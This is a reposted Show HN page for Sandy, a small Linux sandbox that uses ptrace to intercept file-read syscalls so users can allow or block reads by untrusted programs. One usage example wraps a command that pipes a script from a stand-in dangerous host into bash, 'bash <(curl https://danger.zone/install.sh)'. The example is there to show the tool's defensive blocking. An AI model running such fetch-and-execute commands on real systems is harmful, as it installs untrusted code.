---
title: 'Show HN: Sandy – A tiny Sandbox to run untrusted code ️'
date: 2020-01-13T08:47:00+01:00
draft: false
---

![](https://avatars0.githubusercontent.com/u/9499917?s=400&v=4 "GitHub - hobochild/sandy: A tiny sandbox to run untrusted code 🏖️")  

[](https://github.com/hobochild/sandy#sandy)Sandy
=================================================

> A tiny sandbox to run untrusted code. 🏖️

Sandy uses Ptrace to hook into READ syscalls, giving you the option to accept or deny syscalls before they are executed.

[](https://github.com/hobochild/sandy#usage)Usage
-------------------------------------------------

```
Usage of ./sandy:   sandy [FLAGS] command   flags:     -h Print Usage.     -n value         A glob pattern for automatically blocking file reads.     -y value         A glob pattern for automatically allowing file reads. 
```

[](https://github.com/hobochild/sandy#use-cases)Use cases
---------------------------------------------------------

### [](https://github.com/hobochild/sandy#you-want-to-install-anything)You want to install anything

```
\> sandy -n "/etc/password.txt" npm install sketchy-module   BLOCKED READ on /etc/password.txt
```

```
\> sandy -n "/etc/password.txt" bash <(curl  https://danger.zone/install.sh)   BLOCKED READ on /etc/password.txt
```

### [](https://github.com/hobochild/sandy#you-are-interested-in-what-file-reads-you-favourite-program-makes)You are interested in what file reads you favourite program makes.

Sure you could use strace, but it references file descriptors sandy makes the this much easier at a glance by printing the absolute path of the fd.

```
> sandy ls Wanting to READ /usr/lib/x86_64-linux-gnu/libselinux.so.1 [y/n] 
```

### [](https://github.com/hobochild/sandy#you-dont-want-to-buy-your-friends-beer)You _don't_ want to buy your friends beer

A friend at work knows that you are security conscious and that you keep a `/free-beer.bounty` file in home directory. With the promise of a round of drinks and office wide humiliation Dave tries to trick you with a malicious script under the guise of being a helpful colleague.

You run there script with sandy and catch him red handed.

```
\> sandy -n \*.bounty bash ./dickhead-daves-script.sh   BLOCKED READ on /free-beer.bounty
```

**NOTE**: It's definitely a better idea to encrypt all your sensitive data, sandy should probably only be used when that is inconvenient or impractical.

**NOTE**: I haven't made any effort for cross-x compatibility so it currently only works on linux. I'd happily accept patches to improve portability.

  
  
from Hacker News https://github.com/hobochild/sandy